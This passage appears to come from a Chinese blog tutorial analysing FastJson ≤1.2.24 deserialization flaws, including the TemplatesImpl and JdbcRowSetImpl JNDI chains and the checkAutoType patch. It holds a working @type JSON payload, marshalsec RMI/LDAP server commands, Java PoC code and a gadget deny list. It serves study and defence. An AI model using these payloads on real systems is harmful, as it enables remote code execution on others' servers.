src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.jpg"></p><p>再往下就是新建 Test 实例的过程，并调用 Test类的构造函数 ~</p><p>紧接着就是弹出计算器，整个调用栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">11</span>, Test  </span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">57</span>, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">526</span>, Constructor (java.lang.reflect)  </span><br><span class="line">newInstance:<span class="number">383</span>, Class (java.lang)  </span><br><span class="line">getTransletInstance:<span class="number">408</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  </span><br><span class="line">newTransformer:<span class="number">439</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  </span><br><span class="line">getOutputProperties:<span class="number">460</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  </span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">606</span>, Method (java.lang.reflect)  </span><br><span class="line">setValue:<span class="number">85</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseField:<span class="number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">deserialze:<span class="number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseObject:<span class="number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">parseObject:<span class="number">339</span>, JSON (com.alibaba.fastjson)  </span><br><span class="line">parseObject:<span class="number">302</span>, JSON (com.alibaba.fastjson)  </span><br><span class="line">main:<span class="number">35</span>, PoC</span><br></pre></td></tr></table></figure><p>最后说下细节部分，在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png"></p><h3 id="为什么恶意类需要继承-AbstractTranslet类"><a href="#为什么恶意类需要继承-AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承 AbstractTranslet类"></a>为什么恶意类需要继承 AbstractTranslet类</h3><p>在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.jpg"></p><p>在还原此类时，会判断该父类是否为 ABSTRACT_TRANSLET，如果是的话，将会设置为for 开始的初始值  0 ，如果不是，将抛出异常，这也是为什么需要继承 ABSTRACT_TRANSLET。</p><h3 id="为什么需要对-bytecodes-进行Base64编码"><a href="#为什么需要对-bytecodes-进行Base64编码" class="headerlink" title="为什么需要对 __bytecodes 进行Base64编码"></a>为什么需要对 __bytecodes 进行Base64编码</h3><p>可以发现，在PoC中的<code>_bytecodes</code>字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对<code>_bytecodes</code>字段进行Base64加密处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> &#123;  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer;  </span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;  </span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;  </span><br><span class="line">        <span class="type">byte</span>[] bytes = lexer.bytesValue();  </span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);  </span><br><span class="line">        <span class="keyword">return</span> (T) bytes;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其实它的调用实在setValue()前面进行处理的：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png"></p><p>跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png"></p><p>跟进bytesValue()函数，就是对<code>_bytecodes</code>的内容进行Base64解码：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png"></p><h3 id="为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法"><a href="#为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法" class="headerlink" title="为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法"></a>为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法</h3><p>getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。</p><h3 id="如何关联-outputProperties与getOutputProperties-方法"><a href="#如何关联-outputProperties与getOutputProperties-方法" class="headerlink" title="如何关联_outputProperties与getOutputProperties()方法"></a>如何关联_outputProperties与getOutputProperties()方法</h3><p>Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。</p><p>具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> &#123;  </span><br><span class="line">    <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer; <span class="comment">// xxx  </span></span><br><span class="line">    <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> smartMatch(key);</span><br></pre></td></tr></table></figure><p>在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的<code>_</code>，从而使得<code>_outputProperties</code>变成了outputProperties：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.jpg"></p><p>既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了</p><h2 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h2><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p><h3 id="JNDI-RMI-复现利用"><a href="#JNDI-RMI-复现利用" class="headerlink" title="JNDI + RMI 复现利用"></a>JNDI + RMI 复现利用</h3><p>PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：</p><p><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</code></p><p> 开个RMI 服务, 绑定第三方服务器为 127.0.0.1:7777  RMI端口为9999<br>&#96;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <a href="http://127.0.0.1:7777/#Exec">http://127.0.0.1:7777/#Exec</a> 9999</p><p>开启第三方python服务提供恶意类<br><code>python -m http.server 7777</code></p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:9999/Exec\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            System.out.println(payload);  </span><br><span class="line">            JSON.parseObject(payload);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            System.out.println(e.getMessage());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然 LDAP服务器 也一样 ：<br>&#96;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://127.0.0.1:7777/#Exec">http://127.0.0.1:7777/#Exec</a> 9999<br>协议改成 ldap 即可，两者都可以弹出计算器</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>虽然前面两个复现利用是用的不同的服务，但是都是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来触发的，漏洞点都是JNDI注入导致的。</p><p>在<code>JSON.parse(payload);</code>处打下断点开始往下调试。</p><p>前面的函数调用过程和基于TemplateImpl的调试分析几乎是一样的，只看下区别的地方。</p><p>调用scanSymbol()函数扫描到com.sun.rowset.JdbcRowSetImpl类后，再调用TypeUtils.loadClass()函数将该类加载进来：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.jpg"></p><p>往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png"></p><p>继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。</p><p>由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。</p><p>先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.jpg"></p><p>接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png"></p><p>跟进connect()函数，看到了熟悉的JNDI注入的代码即<code>InitialContext.lookup()</code>，并且其参数是调用<code>this.getDataSourceName()</code>获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png"><br>再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。</p><p>调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">654</span>, JdbcRowSetImpl (com.sun.rowset)  </span><br><span class="line">setAutoCommit:<span class="number">4081</span>, JdbcRowSetImpl (com.sun.rowset)  </span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">606</span>, Method (java.lang.reflect)  </span><br><span class="line">setValue:<span class="number">96</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseField:<span class="number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) </span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseRest:<span class="number">922</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:-<span class="number">1</span>, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">parse:<span class="number">1293</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">parse:<span class="number">137</span>, JSON (com.alibaba.fastjson)  </span><br><span class="line">parse:<span class="number">128</span>, JSON (com.alibaba.fastjson)  </span><br><span class="line">main:<span class="number">6</span>, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure><p>这里的 漏洞触发点是 JSON.parse(payload), 其实改为 JSON.parseObject 也是可以利用成功的，因为JSON.parseObject()会调用到JSON.parse()、再调用DefaultJSONParser.parse()，也就是说JSON.parseObject()本质上还是调用JSON.parse()进行反序列化的，区别不过是parseObject()会额外调用JSON.toJSON()来将Java对象专为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发。</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.jpg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下  FastJson &lt;&#x3D; 1.2.24 版本产生漏洞的原因：</p><ol><li>@type  该关键词的特性会 任意加载类，并给提供的输入字段的值进行恢复，如果字段有setter &#x2F; getter 方法  则会自动调用该方法 进行赋值，恢复出整个类 (触发点)</li><li>在找到可以调用的setter、getter之后，从这个可以被出发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。(利用链)</li><li>沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作(payload的触发)</li></ol><h1 id="Fastjson-1-2-25-1-2-41-补丁绕过"><a href="#Fastjson-1-2-25-1-2-41-补丁绕过" class="headerlink" title="Fastjson 1.2.25 -1.2.41 补丁绕过"></a>Fastjson 1.2.25 -1.2.41 补丁绕过</h1><p>看一下   1.2.24  和 1.2.25 版本jar 包的区别。</p><h2 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType()"></a>checkAutoType()</h2><p>对比 1.2.24 和 1.2.25 的包，能看到如下 将DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png"></p><p>进去看看逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// autoTypeSupport默认为False  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤  </span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点  </span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = deserializers.findClass(typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错  </span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">            || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">           ) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p><p>默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。</p><p>denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bsh  </span><br><span class="line">com.mchange  </span><br><span class="line">com.sun.  </span><br><span class="line">java.lang.Thread  </span><br><span class="line">java.net.Socket  </span><br><span class="line">java.rmi  </span><br><span class="line">javax.xml  </span><br><span 